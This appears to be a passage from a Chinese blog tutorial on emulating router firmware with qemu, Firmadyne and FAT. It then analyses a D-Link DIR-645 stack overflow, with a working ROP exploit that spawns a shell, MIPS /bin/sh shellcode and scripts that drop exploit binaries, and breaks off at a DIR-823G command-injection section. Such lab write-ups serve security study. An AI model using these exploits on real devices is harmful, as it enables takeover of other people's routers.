bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">"root=/dev/sda1 console=tty0"</span> -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><p>然后配置ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.122.12/24 up</span><br></pre></td></tr></table></figure><p>接下来就可以访问外网了</p><h3 id="Firmadyne"><a href="#Firmadyne" class="headerlink" title="Firmadyne"></a>Firmadyne</h3><p>Firmadyne依赖于binwalk，qemu，这个工具可以简化模拟路由器的流程，但不可以调试固件</p><p>将项目克隆下来，并执行setup.sh脚本，会安装所依赖的库和环境，并配置postgresql数据库，数据库用户和密码都为<code>firmadyne</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git</span><br><span class="line">$ <span class="built_in">cd</span> firmadyne &amp;&amp; sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>firmadyne工作流程如下：</p><p>用extractor 提取filesystem，并存储在数据库里和images目录下 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./sources/extractor/extractor.py -b dlink -sql 127.0.0.1 -np -nk <span class="string">"DIR823GA1_FW102B03.bin"</span> images</span><br><span class="line">&gt;&gt; Database Image ID: 1</span><br><span class="line"></span><br><span class="line">/home/iot/tools/firmware-analysis-toolkit/firmadyne/DIR823GA1_FW102B03.bin</span><br><span class="line">&gt;&gt; MD5: 064dd035f7e7be72949166c37f5dd432</span><br><span class="line">&gt;&gt; Tag: 1</span><br><span class="line">&gt;&gt; Temp: /tmp/tmp6s25ib68</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">&gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:xz, size: 4006046 bytes, 917 inodes, blocksize: 131072 bytes, created: 2038-02-22 10:46:24</span><br><span class="line">&gt;&gt;&gt;&gt; Found Linux filesystem <span class="keyword">in</span> /tmp/tmp6s25ib68/_DIR823GA1_FW102B03.bin.extracted/squashfs-root!</span><br><span class="line">&gt;&gt; Skipping: completed!</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmp6s25ib68...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls images/</span><br><span class="line">1.tar.gz  README.md</span><br></pre></td></tr></table></figure><p>识别固件架构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/getArch.sh ./images/1.tar.gz</span><br><span class="line">./bin/busybox: mipsel</span><br></pre></td></tr></table></figure><p>将固件系统内容存储到数据库的image表中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/tar2db.py -i 1 -f ./images/1.tar.gz</span><br></pre></td></tr></table></figure><p>为固件创建qemu磁盘镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo -SE ./scripts/makeImage.sh 1 mipsel</span><br><span class="line">----Running----</span><br><span class="line">----Copying Filesystem Tarball----</span><br><span class="line">----Creating QEMU Image----</span><br><span class="line">Formatting <span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/scratch//1//image.raw'</span>, fmt=raw size=1073741824</span><br><span class="line">----Creating Partition Table----</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.31.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>为qemu建立虚拟接口，并生成run.sh脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ./scripts/inferNetwork.sh 1 mipsel</span><br><span class="line">Running firmware 1: terminating after 60 secs...</span><br><span class="line"></span><br><span class="line">qemu-system-mipsel: terminating on signal 2 from pid 25160 (timeout)</span><br><span class="line">Inferring network...</span><br><span class="line">Interfaces: [(<span class="string">'br0'</span>, <span class="string">'192.168.0.1'</span>), (<span class="string">'br1'</span>, <span class="string">'192.168.100.1'</span>)]</span><br><span class="line">Done!</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">iot@attifyos ~/t/f/firmadyne&gt; ls scratch/1/</span><br><span class="line">image/  image.raw  qemu.initial.serial.log  run.sh*</span><br></pre></td></tr></table></figure><p>使用指定的网络配置模拟运行固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/t/f/firmadyne&gt; sudo ./scratch/1/run.sh </span><br><span class="line">Creating TAP device tap1_0...</span><br><span class="line">Set <span class="string">'tap1_0'</span> persistent and owned by uid 0</span><br><span class="line">Bringing up TAP device...</span><br><span class="line">Adding route to 192.168.0.1...</span><br><span class="line">Starting firmware emulation... use Ctrl<span class="_">-a</span> + x to <span class="built_in">exit</span></span><br><span class="line">[    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) <span class="comment">#1 Thu Feb 18 01:44:57 UTC 2016</span></span><br></pre></td></tr></table></figure><p>系统运行成功，主机可以访问，日志记录到<code>./scratch/1/qemu.final.serial.log</code>中</p><p><img alt="image-20200709102510641" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709102510641.png" class="lozad"></p><p>总结 ：</p><p>firmadyne简化了固件模拟的流程，并自动配置网络。其内部工作原理和qemu-system一样，配置网络的过程也是用tunctl 来添加虚拟网卡。方便的是会生成qemu镜像，并把固件信息保存到了数据库里，下一次使用会更加方便些。</p><h3 id="Fat"><a href="#Fat" class="headerlink" title="Fat"></a>Fat</h3><p>fat只需一条命令就可以模拟路由器固件，他是把firmadyne的流程更简化了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit</span><br><span class="line"><span class="built_in">cd</span> firmware-analysis-toolkit</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>但安装不容易成功，主要是依赖的东西太多了，可以使用attifyOs虚拟机，里面已经集成好了。</p><p>一条命名即可模拟路由器固件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fat.py DIR823GA1_FW102B03.bin</span><br></pre></td></tr></table></figure><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>docker是真的香啊，什么环境都有别人搭好的，参考<a href="https://hub.docker.com/r/waveburst/" target="_blank" rel="noopener">https://hub.docker.com/r/waveburst/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull waveburst/qemu-system-mips</span><br><span class="line">sudo docker pull waveburst/qemu-system-mipsel</span><br><span class="line">sudo docker pull waveburst/qemu-system-armhf</span><br><span class="line">sudo docker pull waveburst/qemu-system-armel</span><br></pre></td></tr></table></figure><p>使用如下：</p><p>First you need to run the container with port mapped to 5555 for ssh control.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 5555:5555 waveburst/qemu-system-mips</span><br></pre></td></tr></table></figure><p>Now you can simply log in to your container using ‘<code>mips:mips</code>‘ credentials</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 5555 mips@localhost</span><br></pre></td></tr></table></figure><p>You can verity that you are inside the qemu-system simply by executing ‘<code>uname -a</code>‘ command. It should return:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux docker-mips-debian 4.9.0-8-4kc-malta #1 Debian 4.9.130-2 (2018-10-27) mips GNU/Linux</span><br></pre></td></tr></table></figure><h2 id="OpenWRT"><a href="#OpenWRT" class="headerlink" title="OpenWRT"></a>OpenWRT</h2><p>OpenWRT是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，常常被用于工控设备、电话、小型机器人、智能家居、路由器以及VOIP设备中。 同时，它还提供了100多个已编译好的软件，而且数量还在不断增加，而 OpenWrt SDK 更简化了开发软件的工序</p><p>而且OpenWRT支持各种处理器架构，无论是对ARM，X86，PowerPC或者MIPS都有很好的支持。</p><p><img alt="image-20200709171345194" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200709171345194.png" class="lozad"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M virt -m 64 -kernel zImage-initramfs -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span><br></pre></td></tr></table></figure><h2 id="IOT常见漏洞"><a href="#IOT常见漏洞" class="headerlink" title="IOT常见漏洞"></a>IOT常见漏洞</h2><p><img alt="image-20200710092958488" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710092958488.png" class="lozad"></p><h2 id="D-Link-DIR-645栈溢出分析"><a href="#D-Link-DIR-645栈溢出分析" class="headerlink" title="D-Link DIR-645栈溢出分析"></a>D-Link DIR-645栈溢出分析</h2><p>漏洞描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/e/_/squashfs-root&gt; cd var/</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; mkdir run</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; cd run/</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; ls</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch hash</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch password</span><br></pre></td></tr></table></figure><p>### </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 300 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span class="built_in">hash</span> </span><br><span class="line">[*] Create pattern string contains 300 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span class="built_in">hash</span> ok!</span><br><span class="line">[+] take time: 0.0024 s</span><br><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 20 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/password </span><br><span class="line">[*] Create pattern string contains 20 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/password ok!</span><br><span class="line">[+] take time: 0.0003 s</span><br></pre></td></tr></table></figure><p>先把widget程序跑起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static   -g 1234 ./usr/sbin/widget -a var/run/password</span><br></pre></td></tr></table></figure><p>漏洞点在读取<code>var/run/hash</code>文件内容时，没有检查size，造成栈溢出。</p><p><img alt="image-20200710145413268" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145413268.png" class="lozad"></p><p><img alt="image-20200710145501082" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145501082.png" class="lozad"></p><p><img alt="image-20200710153118887" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710153118887.png" class="lozad"></p><p>mian函数在结束的时候，会将栈中的函数返回地址赋给 <code>$ra</code>，并将使用过的变量赋给 <code>$s0-$s7</code> <code>$fp</code></p><p><img alt="image-20200710164728734" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710164728734.png" class="lozad"></p><p><code>$gp</code>用来存放一些用于系统维护的static和extern变量</p><p><img alt="image-20200710161557715" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161557715.png" class="lozad"></p><p>在ida里面可以看到在REGINFO这个段内</p><p><img alt="image-20200710161443085" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161443085.png" class="lozad"></p><p>可以看到ra寄存器已经被覆盖成 0x62626262</p><p><img alt="image-20200710155627574" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710155627574.png" class="lozad"></p><p>完整的利用ROP链如下</p><p><img alt="image-20200710162512524" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710162512524.png" class="lozad"></p><p>程序的劫持流程 <code>jr $a</code> -&gt; <code>jr 0x40854000+0x158c8</code> -&gt; <code>jalr 0x40854000+0x159cc</code> -&gt; <code>jalr system(cmd)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x158c8</span><br><span class="line">   0x408698c8:movet9,s5</span><br><span class="line">   0x408698cc:jalrt9</span><br><span class="line">   0x408698d0:addius0,s0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x159cc</span><br><span class="line">   0x408699cc:addius5,sp,16</span><br><span class="line">   0x408699d0:movea1,s3</span><br><span class="line">   0x408699d4:movea2,s1</span><br><span class="line">   0x408699d8:movet9,s0</span><br><span class="line">   0x408699dc:jalrt9</span><br><span class="line">   0x408699e0:movea0,s5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x53200</span><br><span class="line">   0x408a7200 &lt;system&gt;:luigp,0x2</span><br><span class="line">   0x408a7204 &lt;system+4&gt;:addiugp,gp,13024</span><br><span class="line">   0x408a7208 &lt;system+8&gt;:addugp,gp,t9</span><br><span class="line">   0x408a720c &lt;system+12&gt;:addiusp,sp,-72</span><br><span class="line">   0x408a7210 &lt;system+16&gt;:swra,68(sp)</span><br><span class="line">   0x408a7214 &lt;system+20&gt;:sws5,64(sp)</span><br><span class="line">   0x408a7218 &lt;system+24&gt;:sws4,60(sp)</span><br><span class="line">   0x408a721c &lt;system+28&gt;:sws3,56(sp)</span><br><span class="line">   0x408a7220 &lt;system+32&gt;:sws2,52(sp)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_address=<span class="number">0x40854000</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x53200</span><span class="number">-1</span>)<span class="comment"># $s0</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s1</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s2</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s3</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s4</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x159cc</span>)  <span class="comment"># $s5 </span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s6</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s7</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $fp</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x158c8</span>)  <span class="comment"># $ra</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload+=<span class="string">'sh\x00\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"var/run/hash"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x158c8</span></span><br><span class="line"><span class="string">   0x408698c8:  move    t9,s5</span></span><br><span class="line"><span class="string">   0x408698cc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408698d0:  addiu   s0,s0,1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x159cc</span></span><br><span class="line"><span class="string">   0x408699cc:  addiu   s5,sp,16</span></span><br><span class="line"><span class="string">   0x408699d0:  move    a1,s3</span></span><br><span class="line"><span class="string">   0x408699d4:  move    a2,s1</span></span><br><span class="line"><span class="string">   0x408699d8:  move    t9,s0</span></span><br><span class="line"><span class="string">   0x408699dc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408699e0:  move    a0,s5</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="asm-py"><a href="#asm-py" class="headerlink" title="asm.py"></a>asm.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">li $v0,0x6e69622f</span></span><br><span class="line"><span class="string">sw $v0,0($sp)</span></span><br><span class="line"><span class="string">li $v0,0x0068732f</span></span><br><span class="line"><span class="string">sw $v0,4($sp)</span></span><br><span class="line"><span class="string">addiu $a0,$sp,0</span></span><br><span class="line"><span class="string">li $v0,4011</span></span><br><span class="line"><span class="string">li $a1,0</span></span><br><span class="line"><span class="string">li $a2,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode)):</span><br><span class="line">    payload+=<span class="string">'\\x'</span>+hex(ord(shellcode[i]))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><h3 id="start-py-1"><a href="#start-py-1" class="headerlink" title="start.py"></a>start.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    r2=process('sh')</span></span><br><span class="line"><span class="string">    r2.sendline('cd '+firware_path)</span></span><br><span class="line"><span class="string">    r2.sendline('tar -cvf squashfs-root.tar squashfs-root/')</span></span><br><span class="line"><span class="string">    r2.sendline('python -m SimpleHTTPServer 8888')</span></span><br><span class="line"><span class="string">    sleep(2)</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'wget http://192.168.1.2:8888/squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'tar -xvf squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -o bind /dev/ ./squashfs-root/dev/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -t proc /proc/ ./squashfs-root/proc/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'chroot ./squashfs-root sh')</span></span><br><span class="line"><span class="string">    r2.close()</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h3 id="run-sh-1"><a href="#run-sh-1" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">'''startvm.sh</span></span><br><span class="line"><span class="string">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'$ '</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'musl-gcc  -static -O2 exp.c -o exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c exp &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>) <span class="comment">#heredoc</span></span><br><span class="line">    r.sendline((read(<span class="string">'exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>) </span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">exploit(process(<span class="string">'startvm.sh'</span>))</span><br></pre></td></tr></table></figure><h2 id="D-link-DIR-823G命令执行"><a href="#D-link-DIR-823G命令执行" class="headerlink" title="D-link DIR-823G命令执行"></a>D-link DIR-823G命令执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>goahead服务在 请求<code>/HNAP1/</code>页面时 post的数据没有进行过滤，造成了命令注入</p><p><img alt="image-20200714152205064" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152205064.png" 